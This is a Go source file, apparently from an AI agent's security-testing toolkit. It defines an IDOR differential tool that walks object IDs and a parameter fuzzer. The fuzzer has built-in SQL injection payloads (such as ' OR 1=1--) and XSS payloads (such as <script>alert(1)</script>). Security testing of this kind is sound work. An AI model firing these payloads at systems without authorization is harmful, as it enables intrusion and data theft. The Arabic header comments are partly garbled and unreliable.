package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

// IdorDiff — أوراكل للخطورة على الأهداف المصرح بها: يرسل طلب قاعدة ثم طلبات مع
// تغيير معرّف الكائن، ويُقيّس الفرق الحتمي (status + body fingerprint).
//
// هذا الأداة موجودة على الشكل "القياسات المتعددة" — لا تفشل كذبة على "يبدو
// قابلاً للحقن": تقول: "هذا المعرّف يرجع مختلفاً عن ذا"، وتجعل المقصد النهائي
// للتحقق (أن الكائن المرجع حقاً معتبر مقابل الجلسة) يقع على المدى الخاص بالمقصد
// العملي: مقارنة بذلوبات الهويات مع الجلسة المصدقة.
//
// القدرة المقاسة هنا: **إظهار بؤدّة الحدات الموجودة في نطاق مصرح** — وهي
// محدّودة بالأهداف المصرح بها.
func newIdorDiffTool() actool.CoreTool {
	schema := obj(map[string]any{
		"url": str("Absolute endpoint containing the object id (e.g. http://127.0.0.1:3002/api/Users/{ID}). {ID} is replaced with each id. If {ID} is absent, pass param to locate it."),
		"param":     str("If the id is a query parameter: e.g. /api/users?user_id={ID} → set param to user_id (and {ID} appears as the value). If {ID} is in the URL path, param is optional."),
		"method":    map[string]any{"type": "string", "enum": []string{"GET", "POST"}, "description": "Default GET."},
		"id_range":  map[string]any{"type": "string", "description": "\"start-end\" inclusive (default \"1-6\"), or a comma-separated list like \"1,2,3,10,42\". Cap at 20 ids."},
		"params":    map[string]any{"type": "object", "description": "Extra constant parameters to keep constant across all requests.", "additionalProperties": map[string]any{"type": "string"}},
		"headers":   map[string]any{"type": "object", "description": "Extra request headers.", "additionalProperties": map[string]any{"type": "string"}},
		"timeout_ms": intp("Per-request timeout in ms (default 15000)."),
		"insecure":  map[string]any{"type": "boolean", "description": "Skip TLS verification."},
	}, "url")

	desc := "Differential IDOR oracle: measure how the response changes across object ids. Returns the baseline response and a table of (id → status, len, fingerprint, snippet) so you can see which ids return different objects. Use it after authenticating — the questions it answers: which ids exist and what does each return. It confirms nothing by itself; use the measurements to draw the IDOR conclusion against the session."
	return writeTool("IdorDiff", desc, schema, runIdorDiff)
}

type idorRow struct {
	ID      string
	Status  int
	Len     int
	FP      string
	Snippet string
}

func runIdorDiff(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var a struct {
		URL       string            `json:"url"`
		Param     string            `json:"param"`
		Method    string            `json:"method"`
		IDRange   string            `json:"id_range"`
		Params    map[string]string `json:"params"`
		Headers   map[string]string `json:"headers"`
		TimeoutMS int               `json:"timeout_ms"`
		Insecure  bool              `json:"insecure"`
	}
	if err := json.Unmarshal(in, &a); err != nil {
		return actool.Errorf("IdorDiff: " + err.Error()), nil
	}
	if strings.TrimSpace(a.URL) == "" {
		return actool.Errorf("IdorDiff: url is required (template with {ID} or a param name)"), nil
	}
	method := strings.ToUpper(strings.TrimSpace(a.Method))
	if method == "" {
		method = "GET"
	}
	ids, err := parseIDRange(a.IDRange, 6)
	if err != nil {
		return actool.Errorf("IdorDiff: " + err.Error()), nil
	}

	rows := make([]idorRow, 0, len(ids))
	for _, id := range ids {
		u := a.URL
		if strings.Contains(u, "{ID}") {
			u = strings.ReplaceAll(u, "{ID}", id)
		} else if strings.TrimSpace(a.Param) != "" {
			if qu, err := injectQuery(u, a.Param, id); err == nil {
				u = qu
			}
		}
		c := httpCall{Method: method, URL: u, Headers: a.Headers, Timeout: time.Duration(a.TimeoutMS) * time.Millisecond, Insecure: a.Insecure}
		if c.Timeout <= 0 {
			c.Timeout = 15 * time.Second
		}
		res, err := doHTTP(ctx, c)
		o := observation{Status: 0}
		if res != nil {
			o = observe(res, nil)
		} else if err != nil {
			o.Snippet = err.Error()
		}
		rows = append(rows, idorRow{ID: id, Status: o.Status, Len: o.Len, FP: o.FP, Snippet: o.Snippet})
	}

	var b strings.Builder
	fmt.Fprintf(&b, "IdorDiff endpoint=%s method=%s ids=[%s] count=%d\n", a.URL, method, strings.Join(ids, ","), len(rows))
	b.WriteString(" id    status  len   fingerprint\n")
	for _, r := range rows {
		fmt.Fprintf(&b, " %-8s %-7d %-6d %s\n", r.ID, r.Status, r.Len, r.FP)
	}
	// Distinct fingerprints: the measurement of "which responses differ".
	distinct := map[string][]string{}
	repr := map[string]idorRow{}
	for _, r := range rows {
		if r.Status == 0 {
			continue
		}
		if _, ok := distinct[r.FP]; !ok {
			repr[r.FP] = r
		}
		distinct[r.FP] = append(distinct[r.FP], r.ID)
	}
	fmt.Fprintf(&b, "distinct_responses=%d\n", len(distinct))
	i := 0
	for fp, rs := range distinct {
		i++
		r := repr[fp]
		fmt.Fprintf(&b, " response#%d fingerprint=%s ids=[%s] status=%d len=%d snippet=%s\n", i, fp, strings.Join(rs, ","), r.Status, r.Len, r.Snippet)
	}
	b.WriteString("\nMeasurement: ids with different fingerprints ARE different objects. The IDOR verdict requires that the authenticated session should be reading one of them — verify by comparing the session's identity against the responses (e.g. request /api/Users/{session_id}).\n")
	return actool.Text(b.String()), nil
}

func oneSnippet(rows []idorRow) string {
	for _, r := range rows {
		if r.Snippet != "" {
			return r.Snippet
		}
	}
	return ""
}

func parseIDRange(spec string, defaultN int) ([]string, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		spec = fmt.Sprintf("1-%d", defaultN)
	}
	if strings.Contains(spec, ",") {
		parts := strings.Split(spec, ",")
		out := make([]string, 0, len(parts))
		for _, p := range parts {
			out = append(out, strings.TrimSpace(p))
		}
		if len(out) > 20 {
			out = out[:20]
		}
		return out, nil
	}
	var a, b int
	if _, err := fmt.Sscanf(spec, "%d-%d", &a, &b); err != nil {
		if _, err2 := fmt.Sscanf(spec, "%d", &a); err2 == nil {
			b = a
		} else {
			return nil, fmt.Errorf("id_range %q is not \"start-end\" or a comma list", spec)
		}
	}
	if b < a {
		a, b = b, a
	}
	if b > a+19 {
		b = a + 19
	}
	out := make([]string, 0, b-a+1)
	for i := a; i <= b; i++ {
		out = append(out, fmt.Sprintf("%d", i))
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// Fuzz — breadth fuzz of a parameter: send every payload in a standard set,
// aggregate distinct fingerprints/statuses, and return each distinct response.
// This is "more damage" on authorized targets in the sense of finding many
// surface states; every call is recorded with its inputs for citation.
// ---------------------------------------------------------------------------

var fuzzPayloads = map[string][]string{
	"sql_injection": {
		"' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "' AND 1=1--",
		"' AND 1=2--", "OR '1'='1", "union select 1,2,3--", "' OR '1'='1",
		"x' AND email LIKE '%'--", "' || '1'='1", "1' '",
	},
	"xss_common": {
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>", "'><svg/onload=alert(1)>", "javascript:alert(1)",
		"&lt;script&gt;alert(1)&lt;/script&gt;",
	},
}

func newFuzzTool() actool.CoreTool {
	schema := obj(map[string]any{
		"url":        str("Absolute target URL."),
		"param":      str("Parameter to fuzz."),
		"method":     map[string]any{"type": "string", "enum": []string{"GET", "POST"}, "description": "Default GET."},
		"class":      map[string]any{"type": "string", "enum": []string{"sql_injection", "xss_common"}, "description": "Built-in payload set."},
		"payloads":   map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Custom payloads (append to class)."},
		"extra":      map[string]any{"type": "object", "description": "Other constant parameters.", "additionalProperties": map[string]any{"type": "string"}},
		"headers":    map[string]any{"type": "object", "description": "Extra request headers.", "additionalProperties": map[string]any{"type": "string"}},
		"timeout_ms": intp("Per-request timeout in ms (default 10000)."),
	}, "url", "param")

	desc := "Fuzz one parameter with a standard payload set (SQL injection + reflected XSS) or a custom list. Aggregates and dedupes responses; returns each distinct (status, len, fingerprint, snippet) with the payloads that produced it. Use it to enumerate the surface of one parameter on an authorized target."
	return writeTool("Fuzz", desc, schema, runFuzz)
}

func runFuzz(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var a struct {
		URL       string            `json:"url"`
		Param     string            `json:"param"`
		Method    string            `json:"method"`
		Class     string            `json:"class"`
		Payloads  []string          `json:"payloads"`
		Extra     map[string]string `json:"extra"`
		Headers   map[string]string `json:"headers"`
		TimeoutMS int               `json:"timeout_ms"`
	}
	if err := json.Unmarshal(in, &a); err != nil {
		return actool.Errorf("Fuzz: " + err.Error()), nil
	}
	if strings.TrimSpace(a.URL) == "" || strings.TrimSpace(a.Param) == "" {
		return actool.Errorf("Fuzz: url and param are required"), nil
	}
	method := strings.ToUpper(strings.TrimSpace(a.Method))
	if method == "" {
		method = "GET"
	}
	set := append([]string{}, fuzzPayloads[a.Class]...)
	set = append(set, a.Payloads...)
	if len(set) == 0 {
		return actool.Errorf("Fuzz: no payloads (pass class=sql_injection or payloads=[...])"), nil
	}
	timeout := 10 * time.Second
	if a.TimeoutMS > 0 {
		timeout = time.Duration(a.TimeoutMS) * time.Millisecond
	}

	type fuzzRow struct {
		FP        string
		Statuses  []string
		IDs       []string
		Snippet   string
		FirstFPOf map[string]string // fp -> representative status
	}
	uniq := map[string]*fuzzRow{}
	order := []string{}
	for _, p := range set {
		var c httpCall
		if method == "POST" {
			c = httpCall{Method: method, URL: a.URL, Headers: a.Headers, Body: injectForm(a.Extra, a.Param, p), ContentType: "application/x-www-form-urlencoded", Timeout: timeout}
		} else {
			u, err := injectQuery(a.URL, a.Param, p)
			if err != nil {
				continue
			}
			c = httpCall{Method: method, URL: u, Headers: a.Headers, Timeout: timeout}
		}
		res, err := doHTTP(ctx, c)
		if err != nil || res == nil {
			continue
		}
		o := observe(res, nil)
		key := o.FP + fmt.Sprintf("|%d", o.Status)
		r, ok := uniq[o.FP]
		if !ok {
			r = &fuzzRow{FP: o.FP, Statuses: []string{fmt.Sprintf("%d", o.Status)}, Snippet: o.Snippet}
			uniq[o.FP] = r
			order = append(order, o.FP)
		} else {
			r.Statuses = append(r.Statuses, fmt.Sprintf("%d", o.Status))
		}
		r.IDs = append(r.IDs, p)
		_ = key
	}

	sort.Strings(order)
	var b strings.Builder
	fmt.Fprintf(&b, "Fuzz param=%s method=%s payloads=%d distinct=%d\n", a.Param, method, len(set), len(uniq))
	for _, fp := range order {
		r := uniq[fp]
		fmt.Fprintf(&b, "\n[fp=%s statuses=%s] payloads=%d\n  snippets: %s\n", r.FP, dedupJoin(r.Statuses), len(r.IDs), r.Snippet)
		for _, p := range r.IDs {
			fmt.Fprintf(&b, "  payload=%q\n", p)
		}
	}
	return actool.Text(b.String()), nil
}

func dedupJoin(xs []string) string {
	seen := map[string]bool{}
	out := []string{}
	for _, x := range xs {
		if !seen[x] {
			seen[x] = true
			out = append(out, x)
		}
	}
	return strings.Join(out, ",")
}
